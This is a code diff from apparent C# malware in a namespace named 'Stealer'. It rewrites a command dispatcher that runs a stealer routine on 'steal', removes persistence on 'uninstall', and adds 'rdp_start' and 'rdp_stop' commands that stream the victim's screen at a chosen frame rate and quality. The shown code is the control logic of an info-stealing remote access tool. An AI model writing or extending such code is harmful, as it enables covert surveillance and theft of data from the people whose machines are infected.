@@ -99,15 +99,30 @@ namespace Stealer
 
         private static void HandleCommand(string command)
         {
-            switch (command.ToLower().Trim())
+            string cmd = command.Trim();
+            string cmdLower = cmd.ToLower();
+
+            if (cmdLower == "steal")
             {
-                case "steal":
-                    RunStealer();
-                    break;
-                case "uninstall":
-                    try { Persistence.Uninstall(); } catch { }
-                    Environment.Exit(0);
-                    break;
+                RunStealer();
+            }
+            else if (cmdLower == "uninstall")
+            {
+                try { Persistence.Uninstall(); } catch { }
+                Environment.Exit(0);
+            }
+            else if (cmdLower.StartsWith("rdp_start"))
+            {
+                int fps = 5;
+                int quality = 50;
+                string[] parts = cmd.Split(':');
+                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
+                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
+                ScreenStream.Start(fps, quality);
+            }
+            else if (cmdLower == "rdp_stop")
+            {
+                ScreenStream.Stop();
             }
         }
 
